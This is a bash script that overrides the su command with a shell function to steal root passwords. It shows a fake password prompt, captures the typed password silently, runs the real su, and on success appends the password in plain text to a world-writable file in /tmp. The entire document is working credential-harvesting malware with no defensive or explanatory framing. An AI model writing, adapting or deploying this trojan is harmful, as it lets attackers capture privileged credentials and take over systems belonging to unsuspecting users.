#!/bin/bash

# >  desc: 
# >  author: s0nnet
# >  time: 2017-01-19

function su()
{
    local arg_list=(
        "" "-" "-l" "--login"
        "-o" "--command" "--session-command"
        "-f" "--fast"
        "-m" "--preserve-environment" "-p"
        "-s" "--shell=SHELL"
    )

    local flag=0 tmp_arg arg pass

    if [ $UID -eq 0 ];then
        /bin/su $1; unset su; return $?
    fi

    for arg in ${arg_list[@]}
    do
        [ "$1" = "$arg" ] && flag=1
    done

    [ $# -eq 0 ] && flag=1

    tmp_arg=$1; tmp_arg=${tmp_arg:0:1};
    [ "$tmp_arg" != "-" -a $flag -eq 0 ] && flag=1

    if [ $flag -ne 1 ];then
        /bin/su $1; return $?
    fi

    [ ! -f /tmp/pass.txt ] && `touch /tmp/pass.txt && chmod 777 /tmp/pass.txt >/dev/null 2>&1`
    echo -ne "Password:\r\033[?25l"
    read -t 30 -s pass
    echo -ne "\033[K\033[?25h"

    /bin/su && unset su && echo $pass >> /tmp/pass.txt
}

su
